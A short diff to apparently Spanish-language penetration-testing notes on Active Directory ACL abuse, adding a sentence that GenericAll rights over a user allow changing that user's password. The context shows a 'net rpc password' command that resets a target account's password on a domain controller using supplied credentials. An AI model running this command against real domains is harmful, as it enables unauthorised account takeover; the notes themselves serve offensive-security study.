@@ -4,6 +4,8 @@ Tags: #AD #ACL #Linux #Pywhisker #Gettgtpkinit #Net
 
 ## GenerciAll sobre Usuario (ChangePassword)
 
+Si tenemos esta ACL sobre un **User**, tenemos control total sobre el objeto y podemos, entre otras acciones, **cambiar su contraseña** o modificar sus propiedades/permisos.
+
 ```bash 
 Paso 1:
 ❯ net rpc password 'TargetUser' 'P@$$w0rd123!' -U domain.corp/user%'passwd' -S IP_DC
